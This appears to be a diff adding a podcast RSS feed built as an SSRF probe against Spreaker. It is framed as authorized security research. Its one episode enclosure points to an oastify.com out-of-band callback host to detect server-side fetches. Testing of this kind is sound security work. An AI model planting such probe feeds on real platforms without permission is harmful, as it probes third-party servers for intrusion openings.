@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>Spreaker SSRF Enclosure Test</title>
+<description>Security research feed for authorized SSRF testing</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<item>
+<title>EP3 - Enclosure Collaborator Test</title>
+<description>Second-stage enclosure fetch test for authorized SSRF research.</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/ep3</guid>
+<pubDate>Thu, 06 Nov 2026 02:10:00 GMT</pubDate>
+<enclosure url="http://hzk9rly9btvaoh9a25ob00vquh07ow.oastify.com/enclosure-fetch-proof.mp3" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
